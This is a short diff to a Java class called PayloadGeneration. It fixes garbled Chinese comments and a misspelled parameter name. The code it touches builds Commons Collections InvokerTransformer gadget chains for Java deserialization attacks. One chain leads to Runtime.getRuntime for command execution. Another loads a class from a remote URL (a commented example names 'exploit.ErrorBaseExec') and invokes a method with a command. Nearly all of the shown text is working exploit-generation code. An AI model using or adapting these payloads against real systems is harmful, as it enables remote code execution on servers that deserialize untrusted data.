@@ -96,9 +96,9 @@ public class PayloadGeneration {
 	{
 		Transformer[] transformers = new Transformer[] {
 		        new ConstantTransformer(Runtime.class),
-		        new InvokerTransformer("getMethod",                  //∑Ω∑®√˚
-		        		new Class[] {String.class, Class[].class },  //≤Œ ˝¿‡–Õ
-		        		new Object[] {"getRuntime", new Class[0] }), //≤Œ ˝÷µ
+		        new InvokerTransformer("getMethod",      //ÊñπÊ≥ïÂêç
+		        		new Class[] {String.class, Class[].class },  //ÂèÇÊï∞Á±ªÂûã
+		        		new Object[] {"getRuntime", new Class[0] }), //ÂèÇÊï∞ÂÄº
 		        new InvokerTransformer("invoke", 
 		        		new Class[] {Object.class, Object[].class }, 
 		        		new Object[] {null, new Object[0] }),
@@ -113,7 +113,7 @@ public class PayloadGeneration {
 		
 	}
 	
-	private static Transformer getURLClassLoaderTransformer(String url, String classNmae, String method, String cmd ) throws MalformedURLException
+	private static Transformer getURLClassLoaderTransformer(String url, String className, String method, String cmd ) throws MalformedURLException
 	{
 		// String url = "http://*****/java/";
 				// String className = "exploit.ErrorBaseExec";
@@ -135,7 +135,7 @@ public class PayloadGeneration {
 						new InvokerTransformer(
 								"loadClass",
 								new Class[] { String.class },
-								new Object[] { classNmae }
+								new Object[] { className }
 								),
 						new InvokerTransformer(
 								"getMethod",
